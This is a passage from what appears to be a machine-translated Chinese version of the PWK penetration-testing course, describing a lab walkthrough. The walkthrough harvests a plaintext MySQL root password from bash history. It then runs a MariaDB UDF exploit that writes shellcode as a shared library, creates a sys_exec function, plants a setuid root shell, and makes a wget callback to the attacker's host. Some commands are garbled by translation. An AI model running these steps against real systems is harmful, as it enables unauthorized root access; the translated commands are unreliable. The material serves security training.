<div style="position:absolute;top:207145;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这可能会记录在 /var/log/auth.log 中。</font><font style="vertical-align: inherit;">让我们像管理员一样思考并查看位置</font></font></nobr></div>
<div style="position:absolute;top:207164;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可能包含用户信息。</font></font></nobr></div>
<div style="position:absolute;top:207197;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们首先通过查看 /etc/passwd、/etc/group 和 /etc/shadow 来感受一下有​​多少</font></font></nobr></div>
<div style="position:absolute;top:207216;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户和组可以访问目标系统。</font></font></nobr></div>
<div style="position:absolute;top:207249;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，我们收集的唯一有用信息是存在名为“ajla”的用户。</font><font style="vertical-align: inherit;">让我们</font></font></nobr></div>
<div style="position:absolute;top:207269;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查用户的主目录，看看我们能找到什么。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:207303;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">root@ajla:~# </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd /home/ajla</font></font></font></b></nobr></div>
<div style="position:absolute;top:207337;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">root@ajla:/home/ajla# </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls -alh</font></font></font></b></nobr></div>
<div style="position:absolute;top:207354;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">总计 32K</font></font></nobr></div>
<div style="position:absolute;top:207371;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">drwxr-xr-x 3 ajla ajla 4.0K 12 月 10 日 16:37。</font></font></nobr></div>
<div style="position:absolute;top:207388;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">drwxr-xr-x 3 根 4.0K 十二月 10 日 16:22 ..</font></font></nobr></div>
<div style="position:absolute;top:207405;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rw------- 1 ajla ajla 12 月 15 日 16:40 .bash_history</font></font></nobr></div>
<div style="position:absolute;top:207422;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rw-r--r-- 1 ajla ajla 220 Oct 15 17:49 .bash_logout</font></font></nobr></div>
<div style="position:absolute;top:207439;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rw-r--r-- 1 ajla ajla 3.7K Oct 15 17:49 .bashrc</font></font></nobr></div>
<div style="position:absolute;top:207456;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">drwx------ 2 ajla ajla 4.0K Oct 15 17:52 .cache</font></font></nobr></div>
<div style="position:absolute;top:207473;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rw-r--r-- 1 ajla ajla 675 Oct 15 17:49 .profile</font></font></nobr></div>
<div style="position:absolute;top:207490;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rw-r--r-- 1 ajla ajla 0 Oct 15 17:57 .sudo_as_admin_successful</font></font></nobr></div>
<div style="position:absolute;top:207509;left:331"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 930 - 查看 Ajla 的主目录</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:207539;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们在主目录中没有找到太多内容，但让我们看看 .bash_history 看看它们有什么</font></font></nobr></div>
<div style="position:absolute;top:207558;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一直到。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:207593;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">root@ajla:/home/ajla# </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat ./.bash_history</font></font></font></b></nobr></div>
<div style="position:absolute;top:207610;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">须藤关机</font></font></nobr></div>
<div style="position:absolute;top:207629;left:336"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 931 - 查看 Ajla 的 .bash_history</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:207658;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是有趣的。</font><font style="vertical-align: inherit;">相当空的历史意味着该帐户没有被经常使用。</font><font style="vertical-align: inherit;">服务器必须</font></font></nobr></div>
<div style="position:absolute;top:207678;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以某种方式进行了管理，但我们在系统上看不到任何其他用户。</font><font style="vertical-align: inherit;">让我们检查一下</font></font></nobr></div>
<div style="position:absolute;top:207697;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">root 用户的历史记录。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:207732;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">root@ajla:/home/ajla# </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat ~/.bash_history</font></font></font></b></nobr></div>
<div style="position:absolute;top:207749;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码</font></font></nobr></div>
<div style="position:absolute;top:207766;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls</font></font></nobr></div>
<div style="position:absolute;top:207783;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd /var/log/apache2/</font></font></nobr></div>
<div style="position:absolute;top:207800;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tail -f 错误日志 </font></font></nobr></div>
<div style="position:absolute;top:207817;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tail -f 访问.log </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:207834;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mysql -u root -pBmDu9xUHKe3fZi3Z7RdMBeb -h 10.5.5.11 -e 'DROP DATABASE wordpress;'</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:207851;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd /etc/mysql/</font></font></nobr></div>
<div style="position:absolute;top:207868;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls</font></font></nobr></div>
<div style="position:absolute;top:207885;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">光盘~/</font></font></nobr></div>
<div style="position:absolute;top:207902;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls</font></font></nobr></div>
<div style="position:absolute;top:207919;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls -alh</font></font></nobr></div>
<div style="position:absolute;top:207936;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出口 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:208075;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="176"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 176 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:208108;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:209185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:209185;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:209185;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">793</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:208204;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出口</font></font></nobr></div>
<div style="position:absolute;top:208220;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">root@ajla:/home/ajla# </font></font></nobr></div>
<div style="position:absolute;top:208240;left:328"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 932 - 查看 root 用户的历史</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:208269;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">太好了，root 用户被用来管理 Ajla，有一次，MySQL 客户端被用来管理</font></font></nobr></div>
<div style="position:absolute;top:208288;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">删除“wordpress”数据库。</font><font style="vertical-align: inherit;">幸运的是，密码和用户是直接在</font></font></nobr></div>
<div style="position:absolute;top:208308;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令行！</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:208345;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.5 再次以数据库为目标</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:208387;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们有了 Zora 的 MariaDB 实例的根数据库凭据。</font><font style="vertical-align: inherit;">我们回去试试UDF</font></font></nobr></div>
<div style="position:absolute;top:208406;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用这些新的、更高级别的权限再次利用。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:208441;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.5.1</font></font></i></nobr></div>
<div style="position:absolute;top:208441;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开发</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:208478;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提醒一下，我们尝试对 MariaDB 实例运行的五个命令是</font></font></nobr></div>
<div style="position:absolute;top:208498;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在清单 933 中找到。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:208533;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选择@@plugin_dir</font></font></nobr></div>
<div style="position:absolute;top:208550;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选择二进制 0xshellcode 到转储文件@@plugin_dir;</font></font></nobr></div>
<div style="position:absolute;top:208567;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建函数 sys_exec 返回 int soname udf_filename;</font></font></nobr></div>
<div style="position:absolute;top:208584;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">select * from mysql.func where name='sys_exec';</font></font></nobr></div>
<div style="position:absolute;top:208601;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh')</font></font></nobr></div>
<div style="position:absolute;top:208620;left:340"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 933 - MySQL 漏洞的分解</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:208649;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，我们将重新运行 MariaDB 客户端，但这次我们将使用我们发现的根凭据</font></font></nobr></div>
<div style="position:absolute;top:208669;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在阿杰拉。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:208704;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mysql --host=127.0.0.1 --port=13306 --user=root -p</font></font></font></b></nobr></div>
<div style="position:absolute;top:208721;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输入密码： </font></font></nobr></div>
<div style="position:absolute;top:208755;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输入“帮助；” </font><font style="vertical-align: inherit;">或 '\h' 寻求帮助。</font><font style="vertical-align: inherit;">键入 '\c' 清除当前输入语句。</font></font></nobr></div>
<div style="position:absolute;top:208789;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MariaDB [（无）]&gt; </font></font></nobr></div>
<div style="position:absolute;top:208808;left:351"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 934 - 重新运行 MariaDB 客户端</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:208837;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们将</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shell</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量</font><font style="vertical-align: inherit;">设置为</font><font style="vertical-align: inherit;">我们之前生成的 shellcode。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:208872;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MariaDB [（无）]&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置@shell = </font></font></font><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0x </font></font></font><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7f454c4602010100000000000000000003003e000100000000110</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:208889;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">000000000004000000000000000e03b000000000000000000040003800090040001c001b0001000000040</font></font></b></nobr></div>
<div style="position:absolute;top:208906;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">00000000000...00000000000000000000；</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:208925;left:322"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 935 - 创建一个 64 位 shellcode 变量</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:208955;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 shell 变量后，我们将再次验证插件目录是否仍设置为</font></font></nobr></div>
<div style="position:absolute;top:208974;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/home/dev/插件。</font><font style="vertical-align: inherit;">虽然这对于流程来说不是必需的，但最好确定没有任何东西</font></font></nobr></div>
<div style="position:absolute;top:208994;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">改变了。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:209028;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MariaDB [(无)]&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选择@@plugin_dir;</font></font></font></b></nobr></div>
<div style="position:absolute;top:209046;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+--------------------+</font></font></nobr></div>
<div style="position:absolute;top:209062;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">@@plugin_dir |</font></font></nobr></div>
<div style="position:absolute;top:209079;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+--------------------+</font></font></nobr></div>
<div style="position:absolute;top:209096;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">/home/dev/plugin/ |</font></font></nobr></div>
<div style="position:absolute;top:209113;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+--------------------+</font></font></nobr></div>
<div style="position:absolute;top:209130;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 行（0.072 秒） </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:209263;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="177"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 177 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:209296;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:210373;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:210373;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:210373;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">794</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:209392;left:357"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 936 - 验证 plugin_dir</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:209421;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在是真相的时刻。</font><font style="vertical-align: inherit;">让我们尝试将二进制 shell 转储到文件中。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:209456;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MariaDB [(none)]&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选择二进制@shell 到转储文件 '/home/dev/plugin/udf_sys_exec.so</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:209473;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">';</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:209490;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查询正常，1 行受影响（0.078 秒）</font></font></nobr></div>
<div style="position:absolute;top:209509;left:348"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 937 - 将 shell 转储到文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:209539;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效！</font><font style="vertical-align: inherit;">在我们太兴奋之前，我们仍然需要创建一个函数。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:209573;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MariaDB [(none)]&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建函数 sys_exec 返回 int soname 'udf_sys_exec.so';</font></font></font></b></nobr></div>
<div style="position:absolute;top:209591;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查询正常，0 行受影响（0.078 秒）</font></font></nobr></div>
<div style="position:absolute;top:209610;left:374"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 938 - 创建 UDF</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:209639;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MariaDB 没有向我们提供任何错误，使我们相信该函数已创建。</font><font style="vertical-align: inherit;">我们</font></font></nobr></div>
<div style="position:absolute;top:209659;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以通过运行查询</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sys_exec</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数</font><font style="vertical-align: inherit;">的命令进行双重检查</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:209693;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MariaDB [(none)]&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">select * from mysql.func where name='sys_exec';</font></font></font></b></nobr></div>
<div style="position:absolute;top:209710;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+------------+-----+------+---------+</font></font></nobr></div>
<div style="position:absolute;top:209727;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">姓名 | </font><font style="vertical-align: inherit;">返回 | </font><font style="vertical-align: inherit;">dl    </font></font></nobr></div>
<div style="position:absolute;top:209727;left:392"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">类型 |</font></font></nobr></div>
<div style="position:absolute;top:209744;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+------------+-----+------+---------+</font></font></nobr></div>
<div style="position:absolute;top:209761;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">sys_exec | </font><font style="vertical-align: inherit;">2 | </font><font style="vertical-align: inherit;">udf_sys_exec.so | </font><font style="vertical-align: inherit;">功能 |</font></font></nobr></div>
<div style="position:absolute;top:209778;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+------------+-----+------+---------+</font></font></nobr></div>
<div style="position:absolute;top:209795;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 行（0.072 秒）</font></font></nobr></div>
<div style="position:absolute;top:209815;left:354"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 939 - 验证 UDF 是否存在</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:209844;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在让我们</font><font style="vertical-align: inherit;">通过尝试从 Zora 向 Kali 发起网络调用来</font><font style="vertical-align: inherit;">测试</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sys_exec</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> UDF 是否有效</font></font></nobr></div>
<div style="position:absolute;top:209863;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器。</font><font style="vertical-align: inherit;">为此，我们将</font><font style="vertical-align: inherit;">在端口 80 上</font><font style="vertical-align: inherit;">启动 python </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http.server</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并进行</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sys_exec</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> UDF 调用</font></font></nobr></div>
<div style="position:absolute;top:209883;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到我们在端口 80 上的 Kali IP。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:209917;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo python3 -m http.server 80</font></font></font></b></nobr></div>
<div style="position:absolute;top:209934;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 0.0.0.0 端口 80 上提供 HTTP ...</font></font></nobr></div>
<div style="position:absolute;top:209954;left:342"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 940 - 在 Kali 上启动网络服务器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:209983;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在 Web 服务器已经启动，我们可以进行</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sys_exec</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> UDF 调用。</font><font style="vertical-align: inherit;">的语法</font></font></nobr></div>
<div style="position:absolute;top:210003;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数可以在原始 UDF 漏洞利用中找到。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:210037;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MariaDB [（无）]&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选择 sys_exec('wget http://10.11.0.4');</font></font></font></b></nobr></div>
<div style="position:absolute;top:210055;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+------------------------------------+</font></font></nobr></div>
<div style="position:absolute;top:210072;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">sys_exec('wget http://10.11.0.4') |</font></font></nobr></div>
<div style="position:absolute;top:210088;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+------------------------------------+</font></font></nobr></div>
<div style="position:absolute;top:210105;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|    </font></font></nobr></div>
<div style="position:absolute;top:210105;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第256话</font></font></nobr></div>
<div style="position:absolute;top:210122;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+------------------------------------+</font></font></nobr></div>
<div style="position:absolute;top:210139;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 排（0.230 秒）</font></font></nobr></div>
<div style="position:absolute;top:210159;left:366"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 941 - 运行 wget 调用</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:210188;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果该命令有效，我们应该会在我们的网络服务器中看到一个日志条目。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:210223;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 0.0.0.0 端口 80 上提供 HTTP ...</font></font></nobr></div>
<div style="position:absolute;top:210240;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.250 - - [10/Dec/2019 17:49:05] “ </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">GET / HTTP/1.1</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ” 200 -</font></font></nobr></div>
<div style="position:absolute;top:210259;left:336"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 942 - 查看网络服务器的日志</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:210289;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成功！</font><font style="vertical-align: inherit;">我们正在 Zora 上运行代码。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:210451;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="178"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 178 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
